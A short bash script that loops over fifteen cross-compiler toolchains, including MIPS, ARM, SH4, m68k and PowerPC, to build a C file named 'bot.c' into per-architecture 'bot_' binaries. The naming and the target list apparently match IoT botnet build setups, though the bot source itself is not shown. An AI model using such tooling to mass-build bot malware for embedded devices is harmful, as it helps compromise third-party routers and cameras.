#!/bin/bash

# Path to the C source
SOURCE="bot.build/bot.c"

# Required link flags
LDFLAGS="-lm -ldl"

# List of compilers and their output names
declare -A compilers=(
  [i486]="i486/bin/i486-gcc"
  [i586]="i586/bin/i586-gcc"
  [i686]="i686/bin/i686-gcc"
  [m68k]="m68k/bin/m68k-gcc"
  [mips]="mips/bin/mips-gcc"
  [mipsel]="mipsel/bin/mipsel-gcc"
  [powerpc]="powerpc/bin/powerpc-gcc"
  [sh4]="sh4/bin/sh4-gcc"
  [sparc]="sparc/bin/sparc-gcc"
  [armv4l]="armv4l/bin/armv4l-gcc"
  [armv5l]="armv5l/bin/armv5l-gcc"
  [armv6l]="armv6l/bin/armv6l-gcc"
  [armv7l]="armv7l/bin/armv7l-gcc"
  [powerpc-440fp]="powerpc-440fp/bin/powerpc-440fp-gcc"
  [x86_64]="x86_64/bin/x86_64-gcc"
)

# Loop and compile
for arch in "${!compilers[@]}"; do
  COMPILER="${compilers[$arch]}"
  if [ -f "$COMPILER" ]; then
    echo "Compiling for $arch..."
    "$COMPILER" -o "bot_$arch" "$SOURCE" $LDFLAGS
  else
    echo "Compiler for $arch not found at $COMPILER"
  fi
done
